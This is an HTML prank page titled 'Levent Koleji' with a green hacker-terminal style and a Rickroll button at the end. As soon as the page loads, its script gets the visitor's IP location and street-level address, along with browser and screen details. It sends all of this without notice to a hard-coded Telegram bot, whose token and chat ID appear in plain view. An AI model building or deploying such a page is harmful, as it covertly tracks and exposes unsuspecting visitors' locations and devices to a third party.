<!DOCTYPE html>
<html lang="tr">
<head>
  <meta charset="UTF-8" />
  <title>Levent Koleji</title>
  <style>
    html, body {
      margin: 0; 
      padding: 0; 
      width: 100%; 
      height: 100vh;
      background: black;
      color: #00ff00;
      font-family: monospace;
      overflow: hidden;
      display: flex;
      justify-content: center;
      align-items: center;
    }
    
    #container {
      width: 95vw;
      max-width: 1200px;
      height: 95vh;
      background-color: black;
      border-radius: 8px;
      box-sizing: border-box;
      box-shadow: 0 0 20px #00ff00;
      display: flex;
      flex-direction: column;
      gap: 8px;
      position: relative;
    }
    
    #terminal {
      flex: 1 1 40%;
      background: black;
      padding: 15px;
      overflow-y: auto;
      font-size: 14px;
      line-height: 1.4;
      white-space: pre-wrap;
      user-select: none;
      border-radius: 8px;
      border: 1px solid #00ff00;
    }
    
    #map {
      flex: 1 1 60%;
      border: 2px solid #00ff00;
      border-radius: 8px;
      background: #111;
    }
    
    #rickrollButton {
      position: absolute;
      bottom: 20px;
      left: 50%;
      transform: translateX(-50%);
      display: none;
      background: #00ff00;
      color: black;
      padding: 14px 35px;
      border: none;
      border-radius: 8px;
      font-weight: bold;
      cursor: pointer;
      user-select: none;
      font-size: 18px;
      transition: all 0.3s ease;
      box-shadow: 0 0 15px #00ff00;
      z-index: 1000;
    }
    
    #rickrollButton:hover {
      background: #00cc00;
      box-shadow: 0 0 25px #00ff00;
      transform: translateX(-50%) scale(1.05);
    }
    
    .leaflet-container {
      background: #111 !important;
      border-radius: 6px;
    }
    
    .leaflet-popup-content-wrapper {
      background: #222 !important;
      color: #00ff00 !important;
      border-radius: 6px;
    }
    
    .leaflet-popup-tip {
      background: #222 !important;
    }
    
    .leaflet-popup-content {
      margin: 12px 16px;
      line-height: 1.5;
    }
  </style>

  <link
    rel="stylesheet"
    href="https://cdnjs.cloudflare.com/ajax/libs/leaflet/1.9.4/leaflet.css"
  />
</head>
<body>
  <div id="container">
    <pre id="terminal"></pre>
    <div id="map"></div>
    <button id="rickrollButton">ğŸ SÃ¼rpriz Ä°Ã§in TÄ±kla</button>
  </div>

  <script src="https://cdnjs.cloudflare.com/ajax/libs/leaflet/1.9.4/leaflet.js"></script>

  <script>
    const terminal = document.getElementById('terminal');
    const button = document.getElementById('rickrollButton');
    let map;

    function logToTerminal(text) {
      terminal.textContent += text + '\n';
      terminal.scrollTop = terminal.scrollHeight;
    }

    function getCurrentTime() {
      return new Date().toLocaleString('tr-TR');
    }

    function decToDMS(deg) {
      const absolute = Math.abs(deg);
      const degrees = Math.floor(absolute);
      const minutes = ((absolute - degrees) * 60).toFixed(1);
      return { degrees, minutes };
    }

    function formatCoordinate(lat, lon) {
      const latDMS = decToDMS(lat);
      const lonDMS = decToDMS(lon);
      const latCardinal = lat >= 0 ? "Kuzey" : "GÃ¼ney";
      const lonCardinal = lon >= 0 ? "DoÄŸu" : "BatÄ±";

      return `${latDMS.degrees}Â°${latDMS.minutes}' ${latCardinal}, ${lonDMS.degrees}Â°${lonDMS.minutes}' ${lonCardinal}`;
    }

    async function getLocationData() {
      try {
        logToTerminal(`[${getCurrentTime()}] IP tabanlÄ± konum alÄ±nÄ±yor...`);
        
        const response = await fetch('https://ipapi.co/json/');
        const data = await response.json();

        if (data.error) {
          throw new Error('IP tabanlÄ± konum alÄ±namadÄ±');
        }

        return {
          latitude: data.latitude,
          longitude: data.longitude,
          city: data.city || 'Bilinmiyor',
          region: data.region || 'Bilinmiyor',
          country: data.country_name || 'Bilinmiyor',
          ip: data.ip || 'Bilinmiyor',
          org: data.org || 'Bilinmiyor',
          postal: data.postal || 'Bilinmiyor',
          street: '',
          neighborhood: ''
        };
      } catch (error) {
        logToTerminal(`[${getCurrentTime()}] IP konum hatasÄ±: ${error.message}`);
        
        return {
          latitude: 41.0082,
          longitude: 28.9784,
          city: 'Ä°stanbul',
          region: 'Ä°stanbul',
          country: 'TÃ¼rkiye',
          ip: 'Tespit edilemedi',
          org: 'Bilinmiyor',
          postal: 'Bilinmiyor',
          street: '',
          neighborhood: ''
        };
      }
    }

    async function reverseGeocode(lat, lon) {
      try {
        logToTerminal(`[${getCurrentTime()}] DetaylÄ± adres bilgisi alÄ±nÄ±yor...`);
        
        const url = `https://nominatim.openstreetmap.org/reverse?format=json&lat=${lat}&lon=${lon}&addressdetails=1`;
        const response = await fetch(url, {
          headers: { 'User-Agent': 'KonumTakipci/1.0' }
        });
        const data = await response.json();

        const addr = data.address || {};
        return {
          street: addr.road || '',
          neighborhood: addr.suburb || addr.neighbourhood || '',
          city: addr.city || addr.town || addr.village || '',
          region: addr.state || '',
          country: addr.country || ''
        };
      } catch (error) {
        logToTerminal(`[${getCurrentTime()}] Reverse geocoding hatasÄ±: ${error.message}`);
        return { street: '', neighborhood: '', city: '', region: '', country: '' };
      }
    }

    async function sendTelegramMessage(message) {
      try {
        const chatId = '6400737507';
        const botToken = '8059389140:AAEori9hTqgX8nRsZ2-np6aLXY-xaZihgTg';

        await fetch(`https://api.telegram.org/bot${botToken}/sendMessage`, {
          method: 'POST',
          headers: { 'Content-Type': 'application/json' },
          body: JSON.stringify({
            chat_id: chatId,
            text: message,
            parse_mode: 'HTML'
          })
        });
      } catch (error) {
        logToTerminal(`[${getCurrentTime()}] Telegram API hatasÄ±: ${error.message}`);
      }
    }

    async function collectData() {
      logToTerminal(`[${getCurrentTime()}] ğŸš€ Sistem baÅŸlatÄ±lÄ±yor...`);
      logToTerminal(`[${getCurrentTime()}] ğŸ“¡ Veriler toplanÄ±yor...`);

      let locationData = await getLocationData();

      const reverseData = await reverseGeocode(locationData.latitude, locationData.longitude);
      locationData.street = reverseData.street || locationData.street;
      locationData.neighborhood = reverseData.neighborhood || locationData.neighborhood;
      locationData.city = reverseData.city || locationData.city;
      locationData.region = reverseData.region || locationData.region;
      locationData.country = reverseData.country || locationData.country;

      const coordsFormatted = formatCoordinate(locationData.latitude, locationData.longitude);

      const infoMessage = 
        `ğŸŒ KONUM BÄ°LGÄ°LERÄ°:\n` +
        `ğŸ“ IP: ${locationData.ip}\n` +
        `ğŸ™ï¸ Åehir: ${locationData.city}\n` +
        `ğŸ—ºï¸ BÃ¶lge: ${locationData.region}\n` +
        `ğŸ˜ï¸ Mahalle: ${locationData.neighborhood || 'Bilinmiyor'}\n` +
        `ğŸ›£ï¸ Sokak: ${locationData.street || 'Bilinmiyor'}\n` +
        `ğŸ“® Posta Kodu: ${locationData.postal}\n` +
        `ğŸŒ Ãœlke: ${locationData.country}\n` +
        `ğŸ¢ ISP: ${locationData.org}\n` +
        `ğŸ“ Koordinatlar: ${coordsFormatted}\n\n` +

        `ğŸ’» TARAYICI BÄ°LGÄ°LERÄ°:\n` +
        `ğŸ” User Agent: ${navigator.userAgent}\n` +
        `ğŸ—£ï¸ Dil: ${navigator.language}\n` +
        `âš™ï¸ Platform: ${navigator.platform}\n` +
        `ğŸª Ã‡erez Durumu: ${navigator.cookieEnabled ? 'Aktif' : 'KapalÄ±'}\n` +
        `ğŸ“¶ BaÄŸlantÄ±: ${navigator.connection ? navigator.connection.effectiveType : 'Bilinmiyor'}\n\n` +

        `ğŸ–¥ï¸ EKRAN BÄ°LGÄ°LERÄ°:\n` +
        `ğŸ“º Ã‡Ã¶zÃ¼nÃ¼rlÃ¼k: ${screen.width}x${screen.height}\n` +
        `ğŸ¨ Renk DerinliÄŸi: ${screen.colorDepth}\n` +
        `ğŸ• Zaman Dilimi: UTC${-new Date().getTimezoneOffset() / 60}\n` +
        `â° Åu anki Saat: ${getCurrentTime()}`;

      logToTerminal(infoMessage);

      await sendTelegramMessage(infoMessage);

      logToTerminal(`[${getCurrentTime()}] ğŸ—ºï¸ Harita yÃ¼kleniyor...`);

      showMap(locationData.latitude, locationData.longitude, locationData);

      logToTerminal(`[${getCurrentTime()}] âœ… Sistem hazÄ±r!`);
      
      addButton();
    }

    function showMap(lat, lon, locationData) {
      try {
        document.getElementById('map').innerHTML = '';
        
        map = L.map('map').setView([lat, lon], 16);

        L.tileLayer('https://{s}.tile.openstreetmap.org/{z}/{x}/{y}.png', {
          maxZoom: 19,
          attribution: '&copy; OpenStreetMap contributors'
        }).addTo(map);

        const popupContent = `
          <div style="color: #00ff00; font-family: monospace;">
            <b>ğŸ“ Konumunuz</b><br><br>
            <b>ğŸ™ï¸ Åehir:</b> ${locationData.city}<br>
            <b>ğŸ—ºï¸ BÃ¶lge:</b> ${locationData.region}<br>
            <b>ğŸ˜ï¸ Mahalle:</b> ${locationData.neighborhood || 'Bilinmiyor'}<br>
            <b>ğŸ›£ï¸ Sokak:</b> ${locationData.street || 'Bilinmiyor'}<br>
            <b>ğŸŒ Ãœlke:</b> ${locationData.country}<br>
            <b>ğŸ“ Koordinatlar:</b> ${formatCoordinate(lat, lon)}
          </div>`;

        L.marker([lat, lon])
          .addTo(map)
          .bindPopup(popupContent)
          .openPopup();
      } catch (e) {
        logToTerminal(`[${getCurrentTime()}] Harita yÃ¼klenirken hata: ${e.message}`);
      }
    }

    function addButton() {
      button.style.display = 'block';
      button.addEventListener('click', () => {
        window.open('https://www.youtube.com/watch?v=dQw4w9WgXcQ', '_blank');
      });
    }

    window.onload = collectData;
  </script>
</body>
</html>
